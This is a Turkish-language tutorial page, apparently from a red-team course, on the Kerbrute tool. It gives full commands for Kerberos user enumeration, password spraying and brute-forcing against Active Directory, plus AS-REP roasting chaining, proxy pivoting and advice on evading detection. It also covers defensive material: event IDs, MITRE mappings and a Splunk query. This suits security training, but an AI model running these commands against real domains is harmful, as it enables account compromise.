# Kerbrute

> **Kategori:** [3. DİZİN KEŞFİ, GRAF ANALİZİ VE SALDIRI YOLU HARİTALAMA (RECON & BLOODHOUND)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Ronnie Flathers (@ropnop) tarafından Go dilinde geliştirilen; Kerberos Ön Kimlik Doğrulama (Pre-Authentication) protokolü üzerinden hesapları kilitlemeden saniyede binlerce kullanıcı doğrulayan (User Enumeration) ve yüksek hızlı parola püskürtmesi (Password Spraying) yapan CLI saldırı aracı.

---

## 1. Genel Bakış ve Amaç

**Kerbrute**, Active Directory sızma testlerinde kimlik doğrulama aşamasının en kritik ve en hızlı araçlarından biridir. Geleneksel kullanıcı adı doğrulama ve parola deneme yöntemleri (SMB, LDAP veya HTTP üzerinden yapılan denemeler) Windows olay günlüklerinde başarısız oturum açma (Event ID 4625) kayıtları üretir ve etki alanı kilitleme politikasını (Account Lockout Policy) tetikleyerek kullanıcı hesaplarının kilitlenmesine neden olur.

Kerbrute ise **Kerberos Ön Kimlik Doğrulama (RFC 4120)** mekanizmasının mimari tasarımını suistimal eder. Araç, hedef Etki Alanı Denetleyicisinin Anahtar Dağıtım Merkezine (KDC - Port 88) şifresiz veya geçersiz ön kimlik doğrulama verisi içeren bir `AS-REQ` (Authentication Service Request) paketi gönderir. KDC'den dönen standart Kerberos hata kodlarını ayrıştırarak hesabın var olup olmadığını anlar:
- **`KDC_ERR_C_PRINCIPAL_UNKNOWN` (Error Code 6):** Kullanıcı etki alanında mevcut değildir.
- **`KDC_ERR_PREAUTH_REQUIRED` (Error Code 25):** Kullanıcı mevcuttur ve ön kimlik doğrulama beklemektedir.

> [!IMPORTANT]
> **Kritik OPSEC Özelliği:** `userenum` modunda KDC'nin Error Code 25 veya 6 döndürmesi, Windows Güvenlik Günlüklerinde **hiçbir başarısız oturum açma (Event ID 4625) oluşturmaz** ve hesap kilitleme sayaçlarını **asla artırmaz**! Bu sayede saldırgan, 100.000 kişilik bir e-posta/isim listesini dakikalar içinde hesapları kilitleme riski olmadan geçerli kullanıcılara indirgeyebilir.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                              KERBRUTE ÇALIŞMA MİMARİSİ                            |
+-----------------------------------------------------------------------------------+
                                          |
                      [Operatör / Kali Linux / Go Binary]
                  kerbrute userenum --dc <DC_IP> -d <Domain> users.txt
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                        Go Eşzamanlılık Motoru (Goroutines)                        |
|        (Saniyede 500-2000 Paralel Kerberos AS-REQ Paketi Üretimi)                 |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                        Kerberos Protokol İletişimi (UDP/TCP 88)                   |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                         Key Distribution Center (KDC / DC)                        |
+-----------------------------------------------------------------------------------+
                                          |
            +-----------------------------+-----------------------------+
            |                                                           |
            v                                                           v
[KDC_ERR_C_PRINCIPAL_UNKNOWN (0x6)]                         [KDC_ERR_PREAUTH_REQUIRED (0x19 / 25)]
            |                                                           |
            v                                                           v
    [KULLANICI YOK]                                             [GEÇERLİ KULLANICI!]
(Dizin Dışı / Geçersiz)                                     (Oturum Başarısızlığı YOK!
                                                             Hesap Kilitleme YOK!)
                                                                        |
                                                                        v
                                                   +--------------------------------+
                                                   |     passwordspray Modülü       |
                                                   |  (Tek Parola ile AS-REQ Onayı) |
                                                   +--------------------------------+
                                                              |                 |
                                          +-------------------+                 +-------------------+
                                          v                                                         v
                        [KDC_ERR_PREAUTH_FAILED (24)]                                  [KRB_AS_REP (Success)]
                             (Yanlış Parola)                                          (DOĞRU PAROLA + TGT!)
```

### Neden Önemli?

| Yetenek | Operasyonel Değer | Sızma Testi & Kırmızı Takım Avantajı |
|---|---|---|
| **Sıfır Kilitlenme Riskiyle Keşif** | `userenum` modu hesap kilitleme sayaçlarına dokunmaz. | Yüz binlerce isimlik listeleri kurumsal kilitlenme korkusu olmadan doğrular. |
| **Yüksek Performans (Go)** | Çok iş parçacıklı goroutine mimarisiyle saniyede binlerce istek. | Tüm etki alanı kullanıcı doğrulamasını 1-2 dakika içinde tamamlar. |
| **Güvenli Parola Püskürtme** | Tek parolayı tüm listeye belirli aralıklarla (`--delay`) dener. | Zayıf ve varsayılan parolalı hesapları tespit eder. |
| **Bağımsız Statik İkili** | Python veya DLL bağımlılığı olmayan tek bir çalıştırılabilir dosya. | Linux, macOS ve Windows üzerinde doğrudan çalıştırılabilir. |

### Alternatif Araçlarla Karşılaştırma

| Kriter | Kerbrute | DomainPasswordSpray | NetExec (nxc kerberos) | Rubeus (brute) | Spray-Passwords |
|---|---|---|---|---|---|
| **Dil / Platform** | Go (Çapraz Platform) | PowerShell (Windows) | Python (Linux) | C# .NET (Windows) | PowerShell (Windows) |
| **User Enumeration** | **Mükemmel (KDC Error 6)**| Yok | Kısmi | Var | Yok |
| **İşlem Hızı** | **Ultra Hızlı (1000+ req/s)**| Orta | Yüksek | Yüksek | Orta |
| **Log İzi (UserEnum)**| **Event ID 4625 YOK**| N/A | Event ID 4625 YOK | Event ID 4625 YOK | N/A |
| **Kurulum Gereksinimi**| Yok (Tek Binary) | RSAT / Domain Host | Python Paketleri | Windows CLR / C2 | PowerShell Host |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Kerbrute alt komutlar (subcommands) ve bayraklar ile çağrılır:

```bash
kerbrute [alt_komut] [bayraklar]
```

### 2.1 Ana Alt Komutlar (Commands)

| Alt Komut | Açıklama | Operasyonel Senaryo |
|---|---|---|
| `userenum` | Kelime listesindeki kullanıcı adlarını KDC üzerinden doğrular. | Hedef kurumun geçerli personel kullanıcı adlarını ayıklama. |
| `passwordspray` | Belirtilen tek bir parolayı doğrulanmış kullanıcı listesine dener. | Dönemsel (örneğin `Yaz2026!`) parola püskürtme saldırıları. |
| `bruteforce` | Tek veya çoklu kullanıcıya parola listesiyle kaba kuvvet uygular. | Kilitlenme politikası olmayan hesaplara sözlük saldırısı. |
| `bruteuser` | Tek bir kullanıcı adını hedef alarak parola listesini dener. | Belirli bir kritik servis hesabına odaklı parola kırma. |
| `version` | Kerbrute sürüm bilgisini görüntüler. | Versiyon doğrulama. |

### 2.2 Ortak Parametreler Tablosu

| Parametre | Kısa Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|---|
| `--domain` | `-d` | Hedef Active Directory etki alanı adı (FQDN). | `-d "corp.local"` |
| `--dc` | | Hedef Etki Alanı Denetleyicisi IP'si veya FQDN'i. | `--dc "10.10.10.10"` |
| `--threads` | `-t` | Eşzamanlı çalışacak iş parçacığı (goroutine) sayısı. | `-t 50` (Varsayılan: 10) |
| `--output` | `-o` | Geçerli bulunan kullanıcı veya parolaların yazılacağı dosya. | `-o valid_users.txt` |
| `--safe` | | Hesap kilitlenmesini önlemek için kilitlenen kullanıcıları atlar. | `--safe` |
| `--delay` | | İstekler arasına milisaniye cinsinden gecikme ekler. | `--delay 100` |
| `--downgrade` | | Kerberos şifrelemesini `rc4-hmac` (Type 23) seviyesine düşürür. | `--downgrade` |
| `-v`, `--verbose` | | Başarısız istekler dahil tüm denemeleri ekrana basar. | `-v` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Kilitlenme Riski Olmadan Kullanıcı Adı Doğrulama (User Enumeration)

Hedef firmanın çalışan isimlerinden oluşturulan kelime listesini kullanarak etki alanındaki geçerli kullanıcıları saptama:

```bash
kerbrute userenum \
  --dc 10.10.10.10 \
  -d corp.local \
  -t 100 \
  -o /opt/recon/valid_users.txt \
  /usr/share/wordlists/names.txt
```

**Konsol Çıktısı Analizi:**

```text
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/ 

Version: v1.0.3 (9dad6e1) - 10/14/26 - Ronnie Flathers @ropnop

2026/10/14 15:20:00 >  Using KDC(s):
2026/10/14 15:20:00 >   10.10.10.10:88

2026/10/14 15:20:01 >  [+] VALID USERNAME:       ahmet@corp.local
2026/10/14 15:20:02 >  [+] VALID USERNAME:       mehmet@corp.local
2026/10/14 15:20:03 >  [+] VALID USERNAME:       ayse@corp.local
2026/10/14 15:20:05 >  [+] VALID USERNAME:       svc_sql@corp.local
2026/10/14 15:20:12 >  Done! Tested 15,420 usernames (4 valid) in 12.140 seconds
```
*Analiz: 15.420 isimlik liste yalnızca 12 saniyede taranmış, 4 adet geçerli kullanıcı adı tespit edilmiş ve kurban sistemlerde tek bir 4625 logu veya hesap kilitlemesi oluşmamıştır.*

### Senaryo 2: Etki Alanı Genelinde Güvenli Parola Püskürtme (Password Spraying)

Doğrulanmış kullanıcı listesine, şirketlerde yaygın kullanılan mevsimlik bir parolayı güvenli aralıklarla püskürtme:

```bash
kerbrute passwordspray \
  --dc 10.10.10.10 \
  -d corp.local \
  -t 10 \
  --delay 250 \
  /opt/recon/valid_users.txt 'Sonbahar2026!'
```

**Konsol Çıktısı Analizi:**

```text
2026/10/14 15:22:10 >  Starting password spray against 4 users with password: Sonbahar2026!
2026/10/14 15:22:11 >  [-] Failed: ahmet@corp.local:Sonbahar2026!
2026/10/14 15:22:11 >  [+] VALID LOGIN:  ayse@corp.local:Sonbahar2026!
2026/10/14 15:22:12 >  [-] Failed: mehmet@corp.local:Sonbahar2026!
2026/10/14 15:22:12 >  [-] Failed: svc_sql@corp.local:Sonbahar2026!
2026/10/14 15:22:12 >  Done! Tested 4 logins (1 success) in 2.115 seconds
```
*Analiz: `ayse@corp.local` kullanıcısının parolası başarıyla ele geçirilmiştir. Operatör artık bu geçerli kimlik bilgisiyle etki alanı keşfini derinleştirebilir.*

### Senaryo 3: Belirli Bir Kritik Kullanıcıya Hedefli Sözlük Saldırısı (bruteuser)

Hesap kilitleme politikası uygulanmayan (örneğin `svc_backup` servis hesabı) bir hedefe özel parola listesi deneme:

```bash
kerbrute bruteuser \
  --dc 10.10.10.10 \
  -d corp.local \
  --safe \
  /usr/share/wordlists/passwords.txt \
  svc_backup
```

### Senaryo 4: SOCKS Proxy / C2 Pivoting Üzerinden Kerbrute Çalıştırma

İç ağdaki bir pivot üzerinden proxychains ile tünellenerek Kerberos isteklerini yönlendirme:

```bash
proxychains4 kerbrute userenum --dc 192.168.1.10 -d corp.local -t 5 users.txt
```

### Senaryo 5: Doğrulanan Kullanıcıları Otomatik Olarak AS-REP Roasting'e Besleme

Kerbrute ile geçerli kullanıcıları bulup, Impacket'in `GetNPUsers.py` aracına borulayarak anında AS-REP bilet özeti talep etme:

```bash
# 1. Kullanıcıları doğrulama
kerbrute userenum --dc 10.10.10.10 -d corp.local -o valid.txt users.txt

# 2. Doğrulanan kullanıcıları AS-REP Roasting için sorgulama
GetNPUsers.py corp.local/ -usersfile valid.txt -no-pass -dc-ip 10.10.10.10 -format hashcat
```

### Senaryo 6: Büyük Ölçekli İsim Listelerinde Thread ve Hız Optimizasyonu

100 binden fazla aday kullanıcı içeren dev listeleri KDC'yi kilitlemeden en optimum sürede taramak için iş parçacığı ve tampon yönetimi:

```bash
kerbrute userenum \
  --dc dc01.corp.local \
  -d corp.local \
  -t 75 \
  --delay 50 \
  -o /opt/recon/corporate_active_users.txt \
  /opt/wordlists/all_employees_huge.txt
```
*75 thread ve 50ms gecikme dengesi, KDC sunucusunda aşırı CPU yükü oluşturmadan dakikada yaklaşık 20.000 sorgu hızına ulaşılmasını sağlar.*

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Olası Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `KDC_ERR_C_PRINCIPAL_UNKNOWN on ALL users (even known ones)` | `--domain` parametresine girilen etki alanı adı ile KDC'nin resmi Realm adı uyuşmuyor veya büyük/küçük harf duyarlılığı var. | Etki alanı adını tam FQDN olarak ve büyük harflerle yazmayı deneyin (`-d CORP.LOCAL`). DNS adresiyle DC IP'sini eşleştirin. |
| `i/o timeout / dial tcp: i/o timeout on port 88` | DC'nin Kerberos portuna (88 UDP/TCP) erişilemiyor, güvenlik duvarı engeli var veya routing eksik. | `nc -nvz -u <DC_IP> 88` ve `nc -nvz <DC_IP> 88` ile hem UDP hem TCP erişimini test edin. |
| `STATUS_ACCOUNT_LOCKED_OUT during passwordspray` | Parola püskürtme sırasında şirketin kilitlenme eşiği aşıldı. | Saldırıyı derhal durdurun. `--safe` bayrağını kullanın, `--delay` parametresini artırın ve denemeleri etki alanı kilitleme süresine (örneğin 30 dakikada bir) yayın. |
| `KRB_AP_ERR_SKEW / Time skew too great` | Saldırgan makinesinin sistem saati ile Etki Alanı Denetleyicisinin saati arasında 5 dakikadan fazla fark var. | Saatinizi DC ile senkronize edin: `rdate -n <DC_IP>` veya `sudo ntpdate <DC_IP>`. |
| `KDC_ERR_ETYPE_NOSUPP` | KDC yalnızca modern AES şifrelemeyi destekliyor ancak Kerbrute eski şifreleme gönderiyor. | `--downgrade` bayrağını kaldırın veya Kerbrute sürümünüzün AES128/AES256 desteklediğinden emin olun. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

Kerbrute'un `userenum` modu uç nokta seviyesinde sessiz olsa da, **Ağ ve Etki Alanı Denetleyicisi seviyesinde** belirgin Kerberos izleri bırakır.

### 5.1 Bırakılan İzler ve Log Kaynakları

1. **Windows Security Event ID 4768 (A Kerberos authentication ticket (TGT) was requested):**
   - Her `userenum` isteğinde KDC üzerinde bir Event ID 4768 üretilir.
   - Başarısız/geçersiz kullanıcı sorgularında: **Result Code `0x6` (`KDC_ERR_C_PRINCIPAL_UNKNOWN`)**.
   - Var olan kullanıcı sorgularında: **Result Code `0x19` (`KDC_ERR_PREAUTH_REQUIRED`)**.
   - Mavi takım SIEM korelasyonlarında, kısa sürede yüzlerce `0x6` hata kodu üreten IP adresleri anında alarm tetikler.
2. **Windows Security Event ID 4625 (Logon Failure):**
   - `passwordspray` ve `bruteforce` modlarında yanlış parola denendiğinde hem Event ID 4625 hem de Event ID 4768 (Result Code `0x18` - `KDC_ERR_PREAUTH_FAILED`) oluşur.

### 5.2 Ağ ve EDR İmzaları

- **Port 88 Trafik Hacmi:** Normal kullanıcı davranışı dakikada 1-2 Kerberos isteğiyken, Kerbrute saniyede yüzlerce UDP/TCP 88 paketi gönderir.
- **İstemci Parmak İzi:** Go Kerberos istemcisinin gönderdiği `AS-REQ` paketlerindeki şifreleme süitleri (Cipher Suites) ve PA-DATA yapıları.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kerbrute Kullanımı |
|---|---|---|
| **T1087.002** | Account Discovery: Domain Account | `userenum` ile kullanıcı doğrulama |
| **T1110.003** | Brute Force: Password Spraying | `passwordspray` ile parola deneme |
| **T1110.001** | Brute Force: Password Guessing | `bruteuser` ile tekil hesaba sözlük saldırısı |
| **T1078.002** | Valid Accounts: Domain Accounts | Başarılı giriş ile TGT elde etme |

### 5.4 OPSEC Önerileri

| Risk | Tespit Sebebi | OPSEC Önlemi |
|---|---|---|
| **Event ID 4768 (0x6) Fırtınası** | Yanlış isimlerin ardışık KDC Error 6 üretmesi. | Rastgele kaba kuvvet yapmayın; OSINT (LinkedIn, e-posta formatları) ile doğrulanmış isimleri hedefleyin. |
| **Aşırı İstek Frekansı** | Saniyede 1000 Kerberos isteğinin IDS/IPS'e takılması. | İş parçacığı sayısını düşürün (`-t 2`) ve `--delay 500` ile paketler arasına gecikme koyun. |
| **Hesap Kilitlenmesi** | `passwordspray` modunda eşiğin aşılması. | Püskürtme öncesi `net accounts` ile kilitleme politikasını öğrenin; her hesap için oturum başına yalnızca 1 parola deneyin. |

### 5.5 Savunma Karşılığı (Blue Team & Detection)

Kerbrute kullanıcı doğrulama saldırısını tespit eden örnek Splunk / ELK korelasyon sorgusu:

```text
index=wineventlog EventCode=4768 Status="0x6"
| stats count by IpAddress, TargetUserName
| where count > 50
```
*Açıklama: Aynı kaynak IP adresinden kısa süre içerisinde 50'den fazla var olmayan kullanıcı için TGT talebi (Status 0x6) gelmesi Kerbrute user enumeration aktivitesinin kesin göstergesidir.*

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Kilitlenme Riski Olmadan Kullanıcı Listesi Doğrulama (User Enum)
kerbrute userenum --dc 10.10.10.10 -d corp.local -t 50 -o valid_users.txt names.txt
```
- **Ne Yapar?** İsim listesini KDC Error 25/6 kodlarıyla test ederek geçerli kullanıcıları ayıklar.
- **Ne Zaman Kullanılır?** İlk keşif aşamasında hedef şirketin çalışan kullanıcı adlarını belirlerken.
- **Parametreler:** `userenum` mod; `-d` etki alanı; `-t` thread sayısı; `-o` çıktı dosyası.

```bash
# 2. Tek Bir Parolayı Tüm Kullanıcılara Püskürtme (Password Spray)
kerbrute passwordspray --dc 10.10.10.10 -d corp.local -t 10 valid_users.txt 'Bahar2026!'
```
- **Ne Yapar?** Belirtilen parolayı listedeki her kullanıcıya bir kez deneyerek oturum açmaya çalışır.
- **Ne Zaman Kullanılır?** Doğrulanmış kullanıcı listesi elde edildikten sonra toplu parola denemesinde.
- **Parametreler:** `passwordspray` mod; son argüman denenecek paroladır.

```bash
# 3. Kilitlenmeye Karşı Korumalı Parola Püskürtme (--safe)
kerbrute passwordspray --dc 10.10.10.10 -d corp.local --safe valid_users.txt 'Password123'
```
- **Ne Yapar?** Kilitlenme riski olan veya kilitli hesapları atlayarak püskürtmeyi sürdürür.
- **Ne Zaman Kullanılır?** Katı etki alanı kilitleme politikalarının bulunduğu kurumsal ağlarda.
- **Parametreler:** `--safe` kilitlenme koruması bayrağı.

```bash
# 4. İstekler Arasına Gecikme Ekleyerek Sessiz Tarama (--delay)
kerbrute userenum --dc 10.10.10.10 -d corp.local -t 2 --delay 500 users.txt
```
- **Ne Yapar?** Her Kerberos isteği arasına 500 ms bekleme süresi koyarak ağ gürültüsünü düşürür.
- **Ne Zaman Kullanılır?** Aktif SOC ve NDR sistemlerinin izleme yaptığı hassas sızma testlerinde.
- **Parametreler:** `--delay` milisaniye cinsinden bekleme süresi.

```bash
# 5. Tek Bir Kullanıcıya Hedefli Parola Listesi Deneme (bruteuser)
kerbrute bruteuser --dc 10.10.10.10 -d corp.local passwords.txt svc_backup
```
- **Ne Yapar?** Yalnızca belirtilen kullanıcı hesabı için parola sözlüğüyle kaba kuvvet dener.
- **Ne Zaman Kullanılır?** Kilitlenme eşiği olmayan servis hesaplarına parola kırarken.
- **Parametreler:** `bruteuser` tek kullanıcı modu; son argüman kullanıcı adı.

```bash
# 6. Çoklu Kullanıcı ve Çoklu Parola Matris Saldırısı (bruteforce)
kerbrute bruteforce --dc 10.10.10.10 -d corp.local combo.txt
```
- **Ne Yapar?** `kullanıcı:parola` ikililerini içeren combo listesini Kerberos üzerinden test eder.
- **Ne Zaman Kullanılır?** Sızdırılmış kimlik bilgisi (credential dump) doğrulamalarında.
- **Parametreler:** `bruteforce` combo listesi modu.

```bash
# 7. SOCKS Proxy / C2 Pivot Üzerinden Çalıştırma
proxychains4 kerbrute userenum --dc 192.168.1.10 -d corp.local -t 5 users.txt
```
- **Ne Yapar?** Tüm Kerberos UDP/TCP paketlerini yerel SOCKS tüneli üzerinden iç ağa iletir.
- **Ne Zaman Kullanılır?** İç ağa bir C2 oturumu üzerinden pivot yapıldığında.
- **Parametreler:** `proxychains4` tünelleme aracı.

```bash
# 8. Şifreleme Seviyesini Düşürerek Çalıştırma (--downgrade)
kerbrute passwordspray --dc 10.10.10.10 -d corp.local --downgrade valid_users.txt 'Pass123'
```
- **Ne Yapar?** İstekleri `rc4-hmac` (Type 23) şifrelemesine zorlar.
- **Ne Zaman Kullanılır?** Eski KDC sunucuları veya özel şifreleme kısıtlamaları olan sistemlerde.
- **Parametreler:** `--downgrade` RC4 şifreleme zorlaması.

```bash
# 9. Ayrıntılı Hata Kodlarını Terminalde İzleme (-v)
kerbrute userenum --dc 10.10.10.10 -d corp.local -v users.txt
```
- **Ne Yapar?** Başarısız isteklerin KDC hata kodlarını (`KDC_ERR_C_PRINCIPAL_UNKNOWN` vb.) ekrana basar.
- **Ne Zaman Kullanılır?** KDC bağlantısında hata ayıklama (troubleshooting) yaparken.
- **Parametreler:** `-v` detaylı çıktı bayrağı.

```bash
# 10. Doğrulanmış Kullanıcıları Otomasyon Dosyasına Yazma (-o)
kerbrute userenum --dc 10.10.10.10 -d corp.local -o /opt/recon/valid.txt users.txt
```
- **Ne Yapar?** Yalnızca geçerli bulunan kullanıcı adlarını temiz bir metin dosyasına kaydeder.
- **Ne Zaman Kullanılır?** Sonuçları parola püskürtme veya AS-REP Roasting araçlarına aktarmak için.
- **Parametreler:** `-o` çıktı dosyası yolu.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [ropnop / kerbrute](https://github.com/ropnop/kerbrute)
- **Ronnie Flathers Blog Yazısı:** [How to User Enum Kerberos - ropnop blog](https://blog.ropnop.com/user-enumeration-via-kerberos/)
- **IETF RFC 4120:** [The Kerberos Network Authentication Service (V5)](https://datatracker.ietf.org/doc/html/rfc4120)
- **MITRE ATT&CK Framework:** [Technique T1087.002 - Domain Account Discovery](https://attack.mitre.org/techniques/T1087/002/)

---

> **Önceki:** [← dnstool.py](./dnstool.md) · **Sonraki:** [DomainPasswordSpray →](./DomainPasswordSpray.md)
